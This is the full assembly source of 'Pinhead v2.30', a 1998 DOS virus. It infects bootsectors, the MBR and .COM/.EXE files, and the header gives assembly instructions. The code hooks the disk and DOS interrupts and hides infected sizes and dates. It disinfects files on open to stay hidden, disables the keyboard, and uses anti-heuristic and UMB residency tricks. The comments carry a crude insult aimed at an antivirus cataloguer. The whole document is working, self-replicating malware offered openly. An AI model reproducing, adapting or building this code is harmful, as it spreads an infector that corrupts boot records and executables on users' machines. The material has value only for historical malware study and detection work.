;============================================================================
;
;
;     NAME: Pinhead v2.30
;     TYPE: Multipartite full-stealth bootsector/MBR + .COM & .EXE-infector.
;   AUTHOR: T-2000 / [Invaders].
;   ORIGIN: Cyberdyne Electronics, Los Angeles.
;     DATE: May - September 1998.
;    PHASE: Release.
;     SIZE: 1024 bytes.
;   RATING: 88%
;   STATUS: Research.
;  TARGETS: Harddisks, 1.44M diskettes, .COM & .EXE-filez.
;      CPU: 80286+
;
;
;  Experiment in writing a viable full-stealth multipartite bootsector/MBR,
; .COM & .EXE-infector in 1024 bytes.
;
;  I have tried to make Pinhead as viable as possible, I think it pretty
;  much succeeded. It contains no bugs which I know of, has a critical-error
;  handler, stealths bootsectors/MBR's on sector-reads/writes, stealths size
;  with FCBs & handles, disinfects on open & extended open, and infects on
;  program execute & delete. It goes resident from bootsectors/MBRs & files,
;  and uses UMBs if available. Does some other stuff, like anti-debugging,
;  just take a look into the spaghetti...
;
;  Pinhead was more like a personal challenge for me, some time ago I waz
;  talkin' with Buz on IRC, and he found in hard to believe that a viable
;  multipartite full-stealth infector could be coded within 1024 bytez, so
;  I decided to give it a try. The very first version used re-direction-
;  stealth, but that was bringing a huge overhead of code, 4 example, you
;  also need to stealth filetimes, and clean infected files if a program 
;  tries to write to it. That's why I decided to put in a smaller method:
;  disk-stealth. This method of stealthing has some serious disadvantages
;  but can quite well survive in the wild (look at Tremor or HDEuthanasia).
;
;  BTW: Pinhead uses some 286 instructions, dis is done Bcoz then I
;  could use shorter instructions (like bit-shifting & PUSHA). Who's
;  using a XT anyway! (well, maybe that stupid VSUM-bitch... but that
;  should be considered as a advantage).
;
;  Assemble with: TASM pinhead.asm /m
;                 TLINK pinhead.obj
;
;  E-MAIL       EQU     T2000_@hotmail.com
;
;
;                "You said you were only gonna scare him!"
;                             "He's scared..."
;                               - Robocop 2 -
;
;============================================================================

;           _______
;          (  o o  )
;           \ (_) /        THE PINHEAD  -  CODED BY T-2000 / [INVADERS]
;            ³ _ ³
;--------oOOo-----oOOo-------------------------------------------------------


                .286
                .MODEL  TINY
                .STACK  1024
                .CODE


Virus_Size      EQU     (Virus_End - $)
Virus_Mem_Size  EQU     ((Virus_End_Mem - $) + 15) / 16
Res_Check_i13h  EQU     0E1h
Marker_Boot     EQU     19CDh   ; Already-infected boot.
Marker_File     EQU     7A0Ch   ; Already-infected file.
Century         EQU     100 SHL 1       ; Hundred years in datetime-format.
Infected_Date   EQU     (2080 - 1980) SHL 1     ; 2080.

Chk_i21h_Displ  =       (Skip_i21h_Chk - JMP_Data_Byte) - 1

Vir_Start:
                JMP     Boot_Entry
                NOP


; === Original header of our host. ===

Host_Bytes      DW      'ZM'
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      OFFSET Carrier
                DW      0

Int13h          DW      0, 0    ; Disk-interrupt.
Int21h          DW      0, 0    ; DOS.
Int24h          DW      0, 0    ; Error-handler.

                ORG     62

                ; === Real start of the virus. ===

Boot_Entry:
                MOV     SI, 7C00h
                XOR     DI, DI

                CLI
                MOV     SS, DI                  ; Setup stack.
                MOV     SP, SI
                STI

                MOV     DS, DI

                INT     12h                     ; Steal our memory.
                DEC     AX                      ; 2 kB.
                DEC     AX
                MOV     DS:[413h], AX

                SHL     AX, 6                   ; Get our segment.

                MOV     ES, AX                  ; ES = Our new segment.

                CLD                             ; Copy us to segment.
                MOV     CX, 512
                PUSH    CX
                REP     MOVSB

                MOV     AX, 0201h               ; Read rest of virusbody.
                POP     BX                      ; BX = 512.
                MOV     CX, 0
Stored_TS       =       WORD PTR $-2
                MOV     DX, 0
Stored_HD       =       WORD PTR $-2
                INT     13h

                CALL    Hook_Int13h

                INT     19h                     ; Load original bootsector,
Signature       =       WORD PTR $-2            ; (stealthed by us).


JMP_Int13h:     JMP     DWORD PTR CS:Int13h

NewInt13h:
                CMP     AH, Res_Check_i13h      ; Residency-check?
                JNE     No_Res_Check

                XOR     AH, AH

NewInt24h:      MOV     AL, 03h                 ; Dummy error-handler.

                IRET

No_Res_Check:   CMP     AH, 02h                 ; Doing a read?
                JB      JMP_Int13h

                CMP     AH, 03h                 ; Doing a write?
                JA      JMP_Int13h

                JMP     $+2
JMP_Data_Byte   =       BYTE PTR $-1

                PUSHA
                PUSH    DS
                PUSH    ES

                CWD                             ; DS=00h.
                MOV     DS, DX

                MOV     SI, 21h * 4

                MOV     AX, DS:[SI-2]           ; Get segment INT 20h.

                OR      AX, AX                  ; Not set yet?
                JZ      Exit_i21h_Chk

                CMP     AX, 800h                ; Too high?
                JA      Exit_i21h_Chk

                CMP     AX, DS:[SI+2]           ; INT 20h seg = INT 21h seg?
                JNE     Exit_i21h_Chk

                PUSH    CS
                POP     ES

                CLD                             ; Save INT 21h.
                MOV     DI, OFFSET Int21h
                MOVSW
                MOVSW

                ; Hook INT 21h.

                MOV     WORD PTR DS:[SI-4], OFFSET NewInt21h
                MOV     WORD PTR DS:[SI-2], CS

                MOV     CS:JMP_Data_Byte, Chk_i21h_Displ

Exit_i21h_Chk:  POP     ES
                POP     DS
                POPA

Skip_i21h_Chk:  OR      DH, DH                  ; Head zero?
                JNZ     JMP_Int13h

                CMP     CX, 01h                 ; Bootsector/MBR?
                JNE     JMP_Int13h

                PUSHF
                CALL    DWORD PTR CS:Int13h     ; Execute function.
                JC      Do_RETF2

                PUSHF
                PUSHA
                PUSH    DS
                PUSH    ES

                PUSH    ES
                POP     DS

                CMP     DS:[BX+(Signature-Vir_Start)], Marker_Boot
                JNE     Init_Infect

        ; === Re-read original bootsector in caller's buffer. ===

                MOV     AX, 0201h
                MOV     CX, DS:[BX+(Stored_TS-Vir_Start)]
                INC     CX
                MOV     DX, DS:[BX+(Stored_HD-Vir_Start)]
                INT     13h

                JMP     Exit_Inf_Boot

Init_Infect:    MOV     CL, 0Eh

                CMP     DL, 80h                 ; Handling with a harddisk?
                JNB     Store_Boot

                MOV     DH, 01h

Store_Boot:     PUSH    CS
                POP     ES

                PUSH    CX

                CLD                             ; Copy boot to our buffer.
                MOV     SI, BX
                MOV     DI, OFFSET Buffer
                PUSH    DI
                PUSH    CX
                MOV     CX, 512
                PUSH    CX
                REP     MOVSB

                MOV     AX, 0302h               ; Store body & bootsector.
                POP     BX                      ; BX=512.
                POP     CX                      ; Homesector.
                INT     13h

                PUSH    CS
                POP     DS

                CLD                             ; Copy virus into boot.
                MOV     SI, 62
                MOV     DI, OFFSET Buffer + 62
                MOV     CL, (512 - 64) / 2
                REP     MOVSW

                POP     BX                      ; BX = offset buffer.

                MOV     [BX], 3CEBh             ; JMP to virus.
                POP     [BX+(Stored_TS-Vir_Start)]
                MOV     [BX+(Stored_HD-Vir_Start)], DX

                MOV     AX, 0301h               ; Write infected boot/MBR.
                INC     CX                      ; CX=01h.
                INT     13h

Exit_Inf_Boot:  POP     ES                      ; Restore registers.
                POP     DS
                POPA
                POPF

Do_RETF2:       RETF    2


                ; === Entrypoint of infected .EXE-files. ===
START:
                IN      AL, 21h                 ; Save original state IRQ's.
                PUSH    AX

                OR      AL, 00000010b           ; Disable keyboard.
                OUT     21h, AL

                CALL    Get_Delta               ; Get our delta-offset.
Get_Delta:      POP     SI
                SUB     SI, OFFSET Get_Delta

                PUSH    ES

                MOV     AH, Res_Check_i13h      ; INT 13h residency-check.
                INT     13h

                OR      AH, AH                  ; Already installed in i13h?
                JZ      Exec_Host

                MOV     AX, 5802h               ; Get UMB-link state.
                INT     21h

                XOR     AH, AH                  ; Save state on stack.
                PUSH    AX

                MOV     AX, 5803h               ; Add UMBs to memory-chain.
                MOV     BX, 0001h
                INT     21h

                MOV     AX, DS                  ; Get our MCB in AX.
                DEC     AX

                XOR     DI, DI

Find_Last_MCB:  MOV     DS, AX

                CMP     BYTE PTR [DI], 'Z'      ; Last block in chain?
                JE      Found_Last_MCB

                INC     AX                      ; Size MCB-header.
                ADD     AX, DS:[DI+3]           ; Size in block.

                JMP     Find_Last_MCB

Found_Last_MCB: SUB     WORD PTR DS:[DI+3], Virus_Mem_Size

                INC     AX                      ; Get our new segment.
                ADD     AX, DS:[DI+3]

                MOV     ES, AX

                MOV     AX, 5803h               ; Restore UMB-link state.
                POP     BX
                INT     21h

                PUSH    CS
                POP     DS

                CLD                             ; Copy virus to our segment.
                MOV     CX, (Virus_Size / 2)
                REP     MOVSW

                MOV     DS, CX                  ; DS=00h.

                CALL    Hook_Int13h             ; Duh!?

                MOV     AX, 0201h               ; Read MBR with virusint.
                MOV     BX, OFFSET Buffer
                INC     CX                      ; CX=01h.
                MOV     DX, 80h
                INT     13h

                XOR     SI, SI                  ; Zero displacement.

Exec_Host:      POP     ES

                PUSH    CS
                POP     DS

                ADD     SI, (Host_Bytes-Vir_Start)

                POP     AX                      ; Restore original state
                OUT     21h, AL                 ; of IRQ's.

                CMP     [SI], 'ZM'              ; Our host is a .EXE-file?
                JE      Exec_EXE

Exec_COM:       CLD                             ; Copy back original bytes
                MOV     DI, 100h                ; of our host.
                PUSH    ES
                PUSH    DI
                MOV     CX, (24 / 2)
                REP     MOVSW

                PUSH    ES                      ; Restore DS.
                POP     DS

                RETF

Exec_EXE:
                MOV     AX, ES
                ADD     AX, 10h                 ; Plus size PSP.

                ADD     [SI.Init_CS], AX
                ADD     AX, [SI.Init_SS]

                CLI                             ; Restore original stack.
                MOV     SS, AX
                MOV     SP, [SI.Init_SP]
                STI

                PUSH    ES                      ; Restore DS.
                POP     DS

                ; === JMP to host. ===

                JMP     DWORD PTR CS:[SI.Init_IP]


Hook_i24h:
                PUSHA
                PUSH    DS

                PUSH    CS
                POP     DS

                MOV     AX, 3524h               ; Get address INT 24h.
                INT     21h

                MOV     Int24h, BX
                MOV     Int24h+2, ES

                MOV     AH, 25h                 ; Our dummy error-handler.
                MOV     DX, OFFSET NewInt24h
                INT     21h

                POP     DS
                POPA

                RETN


Hook_Int13h:
                AND     ES:JMP_Data_Byte, 0

                CLD                             ; Save INT 13h.
                MOV     SI, 13h * 4
                MOV     DI, OFFSET Int13h

                CLI
                MOVSW
                MOVSW
                MOV     WORD PTR DS:[SI-4], OFFSET NewInt13h
                MOV     WORD PTR DS:[SI-2], ES
                STI

                RETN


                DB      'PH'


; Gee, I really hate this stupid bootmarker at the *END* of the bootsector!

                ORG     512


;-------------------------------------
; Returns: CF if invalid host.
;          BP = 0 if not infected.
;          BP = 1 if infected.
;-------------------------------------
Check_4_Infection:

                XCHG    BX, AX                  ; BX = filehandle.

                XOR     BP, BP

                PUSH    DS
                POP     ES

                CLD                             ; Find end of ASCIIZ-string.
                XOR     AL, AL
                MOV     DI, DX
                MOV     CX, 0FFh
                REPNZ   SCASB

                MOV     AL, [DI-2]
                AND     AL, 11011111b           ; Convert 2 uppercase.

                CMP     AL, 'M'                 ; Has file .COM-extension?
                JE      Legal_Candidate

                CMP     AL, 'E'                 ; Has file .EXE-extension?
                JNE     Abort_4

Legal_Candidate:

                MOV     SI, OFFSET Header

                PUSH    CS
                POP     DS

                PUSH    CS
                POP     ES

                MOV     AX, 4400h               ; IOCTL
                INT     21h

                TEST    DL, 80h                 ; Filehandle?
                JNZ     Abort_4

                MOV     AH, 3Fh                 ; Read header.
                MOV     CL, 24
                MOV     DX, SI
                INT     21h

                CMP     [SI.Checksum], Marker_File   ; Already infected?
                JNE     Abort_1

                INC     BP

Abort_1:        OR      BP, BP
                CLC

                RETN

Abort_4:        STC
                RETN


Stealth_Size:
                CALL    OldInt21h               ; Execute function.

                PUSHF
                PUSHA
                PUSH    ES

                OR      AL, AL
                JNZ     Exit_Size_Stealth       ; Abort when error occurred.

                MOV     AX, 2F00h + Century     ; Get DTA-address.
                INT     21h

                CMP     BYTE PTR ES:[BX], 0FFh  ; Extended FCB?
                JNE     No_Ext_FCB

                ADD     BX, 7                   ; Skip extended stuff.

No_Ext_FCB:     CMP     ES:[BX+1Ah], AL
                JB      Exit_Size_Stealth

                SUB     ES:[BX+1Ah], AL         ; Restore original filedate.

                ; === Restore original filesize. ===

                SUB     WORD PTR ES:[BX+1Dh], Virus_Size
                SBB     WORD PTR ES:[BX+1Fh], 0

                JMP     Exit_Size_Stealth


Stealth_Size_Handle:

                CALL    OldInt21h               ; Execute function.

                PUSHF
                PUSHA
                PUSH    ES
                JC      Exit_Size_Stealth       ; Abort when error occurred.

                MOV     AX, 2F00h + Century     ; Get DTA-address.
                INT     21h

                CMP     ES:[BX+19h], AL         ; Infected datestamp?
                JB      Exit_Size_Stealth

                SUB     ES:[BX+19h], AL         ; Restore original filedate.

                ; Rip-off our size.

                SUB     WORD PTR ES:[BX+1Ah], Virus_Size
                SBB     WORD PTR ES:[BX+1Ch], 0

Exit_Size_Stealth:

                POP     ES
                POPA
                POPF

                JMP     Do_RETF2


NewInt21h:
                CMP     AH, 11h                 ; Findfirst (FCB).
                JE      Stealth_Size

                CMP     AH, 12h                 ; Findnext (FCB).
                JE      Stealth_Size

                CMP     AH, 4Eh                 ; Findfirst (handle).
                JE      Stealth_Size_Handle

                CMP     AH, 4Fh                 ; Findnext (handle).
                JE      Stealth_Size_Handle

                CMP     AH, 3Dh                 ; Open (handle).
                JE      Del_Virus

                CMP     AX, 6C00h               ; Extended open.
                JE      Del_Virus

                CMP     AX, 4B00h               ; Execute program.
                JE      Check_Infect

                CMP     AH, 41h                 ; Delete file.
                JE      Check_Infect

JMP_Int21h:     JMP     DWORD PTR CS:Int21h


Del_Virus:
                PUSHA
                PUSH    DS
                PUSH    ES

                CALL    Hook_i24h

                CMP     AX, 6C00h               ; Extended open?
                JNE     No_Ext_Open

                MOV     DX, SI                  ; DS:DX = ASCIIZ-string.

No_Ext_Open:    MOV     AX, 3D02h               ; Open file r/w.
                CALL    OldInt21h
                JC      Exit_Del_Virus

                CALL    Check_4_Infection       ; File infected?
                JC      Close_Del
                JZ      Close_Del

                MOV     AX, 5700h               ; Get filedate & time.
                INT     21h

                PUSH    CX                      ; Save it on the stack.
                PUSH    DX

                MOV     AX, 4202h               ; Go to position original
                MOV     CX, -1                  ; header.
                MOV     DX, -(Virus_Size - 3)
                INT     21h

                MOV     AH, 3Fh                 ; Read original header.
                MOV     CX, 24
                MOV     DX, SI                  ; DX = offset header.
                INT     21h

                MOV     AX, 4202h               ; Go to end of host.
                MOV     CX, -1
                MOV     DX, -Virus_Size
                INT     21h

                MOV     AH, 40h                 ; Write <EOF> marker.
                XOR     CX, CX
                INT     21h

                CALL    Go_BOF

                MOV     AH, 40h                 ; Write original header.
                MOV     CL, 24
                MOV     DX, SI
                INT     21h

                MOV     AX, 5701h               ; Restore original datetime.
                POP     DX
                POP     CX
                SUB     DH, Century             ; Restore original date.
                INT     21h

Close_Del:      MOV     AH, 3Eh                 ; Close file.
                INT     21h

Exit_Del_Virus: JMP     Exit_Inf_File


Check_Infect:
                PUSHA
                PUSH    DS
                PUSH    ES

                CALL    Hook_i24h

                MOV     AX, 3D02h               ; Open da file.
                CALL    OldInt21h
                JC      Exit_Del_Virus

                CALL    Check_4_Infection       ; File already infected?
                JC      Abort_Check
                JZ      Infect_File

Abort_Check:    JMP     Close_File

Infect_File:    PUSH    SI                      ; SI = offset header.

                CLD
                MOV     DI, OFFSET Host_Bytes
                MOV     CL, (24 / 2)
                REP     MOVSW

                POP     SI

                MOV     AX, 5700h               ; Get filedate & time.
                INT     21h

                PUSH    CX                      ; Save it on the stack.
                PUSH    DX

                CALL    Go_EOF

                PUSH    DX
                PUSH    AX

                MOV     AH, 40h                 ; Append virus 2 host.
                MOV     CX, Virus_Size
                CWD                             ; DX = 0.
                INT     21h

                POP     AX
                POP     DX

                CMP     [SI], 'ZM'              ; Host a .EXE-file?
                JNE     Skip_EXE_Stuff

                MOV     CX, 16                  ; Calculate new CS.
                DIV     CX

                SUB     AX, [SI.HeaderSize]     ; Adjust with headersize.
                ADD     DX, OFFSET Start        ; Plus our entrypoint.

                MOV     [SI.Init_CS], AX        ; Set host's new entrypoint.
                MOV     [SI.Init_IP], DX

                INC     AX                      ; Anti-heuristic.

                MOV     [SI.Init_SS], AX
                MOV     [SI.Init_SP], (Virus_Mem_Size * 16) - 16

                ADD     [SI.MinMem], Virus_Mem_Size

                CALL    Go_EOF

                MOV     CX, 512                 ; Calculate 512 byte pages.
                DIV     CX

                OR      DX, DX                  ; No rest?
                JZ      No_Round

                INC     AX                      ; Else upround.

No_Round:       MOV     [SI.Byte_Pages], AX     ; Set new 512-byte pages.
                MOV     [SI.Mod512], DX

                JMP     Skip_JMP

Skip_EXE_Stuff: ADD     AX, (OFFSET Start - 3)

                MOV     [SI.Jump], 0E9h         ; <16-Bit_JMP> opcode.
                MOV     [SI.Displacement], AX

Skip_JMP:       CALL    Go_BOF

                MOV     [SI.Checksum], Marker_File ; Mark file as infected.

                MOV     AH, 40h                 ; Write infected heather.
                MOV     CL, 24
                MOV     DX, SI
                INT     21h

                MOV     AX, 5701h               ; Restore filedate & time.
                POP     DX
                POP     CX
                ADD     DH, Century             ; Set infected datestamp.
                INT     21h

Close_File:     MOV     AH, 3Eh                 ; Close file.
                INT     21h

Exit_Inf_File:  CALL    Unhook_i24h

                POP     ES
                POP     DS
                POPA

                JMP     JMP_Int21h


Go_BOF:
                MOV     AX, 4200h               ; Go to begin of file.
                JMP     Set_Pos

Go_EOF:
                MOV     AX, 4202h               ; Go to end of file.
Set_Pos:        XOR     CX, CX
                CWD

                JMP     OldInt21h

Unhook_i24h:
                MOV     AX, 2524h               ; Restore INT 24h.
                LDS     DX, DWORD PTR CS:Int24h

        ; === Calls da INT 21h be-4 it was hooked by us. ===

OldInt21h:      PUSHF
                CALL    DWORD PTR CS:Int21h

                RETN


Virus_Name      DB      '[Pinhead] done by T-2000'


                ORG     1024
Virus_End:

Buffer          DB      512 DUP(0)
Header          DB      24 DUP(0)

Virus_End_Mem:

COM_Header      STRUC
Jump            DB      0
Displacement    DW      0
COM_Header      ENDS


EXE_Header      STRUC
Mark            DW      0       ; .EXE-identifier (always 'MZ').
Mod512          DW      0
Byte_Pages      DW      0
Num_Reloc       DW      0
HeaderSize      DW      0
MinMem          DW      0
MaxMem          DW      0
Init_SS         DW      0
Init_SP         DW      0
Checksum        DW      0       ; Checksum, unused by MS-DOS.
Init_IP         DW      0       ; Initial IP.
Init_CS         DW      0       ; Initial CS.
EXE_Header      ENDS



Carrier:
                PUSH    CS
                POP     DS

                MOV     AH, 09h                 ; View warning-message.
                MOV     DX, OFFSET Msg
                INT     21h

                MOV     AX, 4C00h               ; Exit to DOS.
                INT     21h

Msg             DB      'WARNING: Dis program is infected with the '
                DB      '[Pinhead] virus! [v2.30]', 0Ah, 0Dh, 0Dh
                DB      'Multipartite full-stealth .COM & .EXE-infector in '
                DB      '1024 bytes, ', 0Ah, 0Dh
                DB      '(only for research).', 0Ah, 0Dh
                DB      'Written in May - September 1998, '
                DB      'by T-2000 / [Invaders].'
                DB      0Ah, 0Dh, '$'

                END     START
